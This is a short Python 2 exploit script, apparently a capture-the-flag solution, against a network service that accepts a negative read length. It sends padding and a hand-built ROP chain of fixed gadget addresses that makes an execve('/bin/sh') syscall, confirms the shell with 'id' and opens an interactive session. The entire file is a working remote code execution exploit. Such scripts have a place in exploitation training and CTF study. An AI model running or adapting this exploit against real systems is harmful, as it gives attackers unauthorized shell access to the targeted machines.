#!/usr/bin/env python2

import sys, socket, telnetlib
from struct import *

def p32(x): return pack('<I', x)
def u32(x): return unpack('<I', x)[0]
def p64(x): return pack('<Q', x)
def u64(x): return unpack('<Q', x)[0]

def recvuntil(t):
    data = ''
    while not data.endswith(t):
        tmp = s.recv(1)
        if not tmp: break
        data += tmp

    return data

def interactive():
    t = telnetlib.Telnet()
    t.sock = s
    t.interact()

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((sys.argv[1], int(sys.argv[2])))
# s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)

recvuntil("read? ")
s.send("-1\n")
recvuntil("data!\n")

p = ''
p += p32(0x080484e3) # call get_n
p += p32(0x0804864e) # pop pop
p += p32(0x0804a040) # .bss
p += p32(0x12341231)
p += p32(0x08048420) # zero eax
p += p32(0x08048459) # zero edx
p += p32(0x0804835d) # pop ebx
p += p32(0x0804a040) # .bss
p += p32(0x080484d3) * 11 # eax = 11
p += p32(0x080484d0) # int $0x80

s.send("I"*48 + p + '\n')
recvuntil('\n')
s.send('/bin/sh\n')

s.send('id\n')
t = s.recv(1024)
print t
if 'uid' in t:
        print "[+] Interactive shell"
        interactive()
        sys.exit(0)

s.close()
